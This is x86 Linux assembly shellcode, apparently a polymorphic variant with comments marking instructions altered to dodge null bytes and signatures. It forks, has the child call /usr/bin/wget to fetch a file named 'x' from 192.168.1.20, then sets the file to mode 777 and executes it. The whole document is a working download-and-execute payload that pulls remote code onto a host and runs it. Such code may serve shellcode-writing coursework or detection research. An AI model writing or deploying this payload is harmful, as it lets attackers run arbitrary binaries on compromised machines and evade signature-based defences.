global _start

section .text

_start:

    ;fork
    xor ecx,ecx         ; [M] zero ecx instead of eax
    mul ecx             ; [M] set eax and edx to zero
    mov al, 0x1         ; [M]
    inc al              ; [M] fork syscall
    int 0x80            ; execute syscall
    mov ebx,edx         ; [M] mov edx into ebx instead of xor ebx,ebx
    cmp eax,ebx
    jz child

    ;wait(NULL)
    xor eax,eax
    mov al,0x8          ; [M]
    dec al              ; [M] waitpid syscall
    int 0x80            ; execute syscall

    ;chmod x
    ;xor ecx,ecx        ; this can be removed
    xor eax, eax        ; zero out eax
    push edx            ; [M] push edx instead of eax, null byte
    mov al, 0xf         ; chmod syscall
    push 0x78           ; "x" character
    mov ebx, esp        ; set current stack pointer to ebx
    mov ecx, edx        ; [M] mov ecx,edx instead of xor ecx,ecx
    mov cx, 0x1ff       ; set chmod mode to 511
    int 0x80            ; execute syscall

    ;exec x
    ;xor eax, eax       ; this can be removed
    push edx            ; [M] push edx instead of eax
    push 0x78           ; "x" character
    mov ebx, esp        ; set current stack pointer to ebx
    push edx            ; [M] push edx instead of eax
    mov edx, esp        ; set current stack pointer to edx
    push ebx
    mov ecx, esp
    mov al, 0xa         ; [M]
    inc al              ; [M] 0xb is execve syscall
    int 0x80            ; execute syscall

child:
    ;download 192.168.1.20/x with wget
    xor ecx, ecx        ; [M]
    mul ecx             ; [M]
    mov al, 0xb         ; [M] execve syscall
    push edx

    push word 0x782f    ; [M] /x avoid null byte
    push 0x30322e31     ; [M] 20.1
    push 0x2e383631     ; .861
    push 0x2e323931     ; .291
    mov ecx,esp
    push edx

    push 0x74           ;t
    push 0x6567772f     ;egw/
    push 0x6e69622f     ;nib/
    push 0x7273752f     ;rsu/
    mov ebx,esp
    push edx
    push ecx
    push ebx
    mov ecx,esp
    int 0x80            ; execute syscall

